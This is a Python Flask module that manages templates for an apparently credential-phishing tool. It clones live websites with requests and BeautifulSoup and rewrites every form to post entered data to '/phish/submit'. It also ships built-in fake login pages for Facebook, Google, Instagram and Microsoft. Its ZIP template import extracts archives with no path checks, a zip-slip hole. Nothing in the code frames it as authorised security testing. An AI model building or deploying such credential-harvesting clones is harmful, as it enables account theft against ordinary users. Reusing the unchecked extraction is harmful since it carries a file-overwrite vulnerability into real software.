import os
import json
import zipfile
from werkzeug.utils import secure_filename
from flask import current_app

class TemplateManager:
    """Manage phishing templates"""
    
    def __init__(self):
        self.templates_dir = os.path.join(current_app.instance_path, 'templates', 'phishing')
        self.ensure_templates_dir()
    
    def ensure_templates_dir(self):
        """Ensure templates directory exists"""
        os.makedirs(self.templates_dir, exist_ok=True)
    
    def save_template(self, file):
        """Save uploaded template file"""
        filename = secure_filename(file.filename)
        
        if filename.endswith('.zip'):
            # Extract ZIP template
            return self.extract_zip_template(file)
        else:
            # Save as single file
            filepath = os.path.join(self.templates_dir, filename)
            file.save(filepath)
            return filename
    
    def extract_zip_template(self, zip_file):
        """Extract ZIP template to templates directory"""
        filename = secure_filename(zip_file.filename)
        template_name = filename.rsplit('.', 1)[0]
        
        template_dir = os.path.join(self.templates_dir, template_name)
        os.makedirs(template_dir, exist_ok=True)
        
        with zipfile.ZipFile(zip_file, 'r') as zip_ref:
            zip_ref.extractall(template_dir)
        
        # Look for main template file
        for file in os.listdir(template_dir):
            if file.endswith('.html') and file.lower() in ['index.html', 'login.html', 'main.html']:
                return f"{template_name}/{file}"
        
        # Return first HTML file found
        for file in os.listdir(template_dir):
            if file.endswith('.html'):
                return f"{template_name}/{file}"
        
        return f"{template_name}/index.html"
    
    def create_template_from_url(self, url, template_name):
        """Create template by cloning a website"""
        import requests
        from bs4 import BeautifulSoup
        from urllib.parse import urljoin, urlparse
        
        try:
            # Fetch the page
            response = requests.get(url, headers={
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            })
            response.raise_for_status()
            
            # Parse HTML
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Modify forms to capture credentials
            forms = soup.find_all('form')
            for form in forms:
                form['action'] = '/phish/submit'
                form['method'] = 'POST'
                
                # Add hidden campaign field
                hidden_input = soup.new_tag('input', type='hidden', name='campaign_id', value='{{ campaign.id }}')
                form.append(hidden_input)
            
            # Update resource URLs to be absolute
            base_url = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            
            # Update links
            for link in soup.find_all('link', href=True):
                link['href'] = urljoin(base_url, link['href'])
            
            # Update scripts
            for script in soup.find_all('script', src=True):
                script['src'] = urljoin(base_url, script['src'])
            
            # Update images
            for img in soup.find_all('img', src=True):
                img['src'] = urljoin(base_url, img['src'])
            
            # Save template
            template_dir = os.path.join(self.templates_dir, template_name)
            os.makedirs(template_dir, exist_ok=True)
            
            template_file = os.path.join(template_dir, 'index.html')
            with open(template_file, 'w', encoding='utf-8') as f:
                f.write(str(soup))
            
            return f"{template_name}/index.html"
            
        except Exception as e:
            print(f"[TEMPLATE] Error creating template from URL: {e}")
            return None
    
    def export_template(self, template_name):
        """Export template as ZIP file"""
        template_dir = os.path.join(self.templates_dir, template_name)
        if not os.path.exists(template_dir):
            return None
        
        import tempfile
        zip_file = tempfile.NamedTemporaryFile(suffix='.zip', delete=False)
        
        with zipfile.ZipFile(zip_file.name, 'w') as zip_ref:
            for root, dirs, files in os.walk(template_dir):
                for file in files:
                    file_path = os.path.join(root, file)
                    arc_name = os.path.relpath(file_path, template_dir)
                    zip_ref.write(file_path, arc_name)
        
        return zip_file.name
    
    def get_builtin_templates(self):
        """Get list of built-in templates"""
        builtin_templates = [
            {
                'name': 'facebook',
                'description': 'Facebook login page clone',
                'category': 'social_media',
                'target_domain': 'facebook.com'
            },
            {
                'name': 'google',
                'description': 'Google login page clone',
                'category': 'email',
                'target_domain': 'google.com'
            },
            {
                'name': 'instagram',
                'description': 'Instagram login page clone',
                'category': 'social_media',
                'target_domain': 'instagram.com'
            },
            {
                'name': 'microsoft',
                'description': 'Microsoft login page clone',
                'category': 'cloud',
                'target_domain': 'microsoft.com'
            }
        ]
        
        return builtin_templates
